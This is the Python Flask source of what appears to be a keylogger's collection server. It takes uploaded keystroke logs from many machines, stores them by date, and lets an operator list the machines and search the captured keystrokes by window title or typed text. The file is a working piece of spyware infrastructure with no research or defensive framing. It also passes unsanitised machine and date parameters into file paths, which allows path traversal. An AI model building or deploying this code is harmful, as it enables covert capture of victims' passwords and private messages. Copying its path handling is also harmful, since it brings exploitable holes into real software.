import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

LOGS_DIR = "data"
os.makedirs(LOGS_DIR, exist_ok=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    machine_name = data.get("machine")
    log = data.get("data")

    if not machine_name or not log:
        return jsonify({"error": "Invalid Data"}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    os.makedirs(machine_dir, exist_ok=True)

    log_file = os.path.join(machine_dir, f"{datetime.now().strftime('%Y-%m-%d')}.json")

    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as file:
            json.dump({}, file)

    with open(log_file, "r", encoding="utf-8") as file:
        logs = json.load(file)
    logs.update(log)

    with open(log_file, "w", encoding="utf-8") as file:
        json.dump(logs, file, indent=4, ensure_ascii=False)

    return jsonify({"message": "Log received"}), 200

@app.route('/api/machines', methods=['GET'])
def list_machines():
    if not os.path.exists(LOGS_DIR):
        return jsonify({"machines": []})

    machines = [
        d for d in os.listdir(LOGS_DIR)
        if os.path.isdir(os.path.join(LOGS_DIR, d))
    ]

    return jsonify({"machines": machines}), 200

@app.route('/api/get_keystrokes', methods=['GET'])
def get_key_strokes_by_machine():
    machine_name = request.args.get("machine")
    date = request.args.get("date")
    window_name = request.args.get("window")
    search_text = request.args.get("searchText")

    if not machine_name:
        return jsonify({"error": "Missing 'machine' query parameter."}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    if not os.path.exists(machine_dir):
        return jsonify({"error": f"Machine {machine_name} not found"}), 404

    logs = {}
    if date:
        log_file = os.path.join(machine_dir, f"{date}.json")
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8") as file:
                logs = json.load(file)
    else:
        for log_file in os.listdir(machine_dir):
            if log_file.endswith(".json"):
                with open(os.path.join(machine_dir, log_file), "r", encoding="utf-8") as file:
                    logs.update(json.load(file))

    if window_name:
        logs = {timestamp: {win: keys for win, keys in windows.items() if window_name.lower() in win.lower()} for timestamp, windows in logs.items()}

    if search_text:
        logs = {timestamp: {win: keys for win, keys in windows.items() if search_text.lower() in keys.lower()} for timestamp, windows in logs.items()}

    return jsonify({"machine": machine_name, "logs": logs}), 200

if __name__ == "__main__":
    app.run(debug=True)
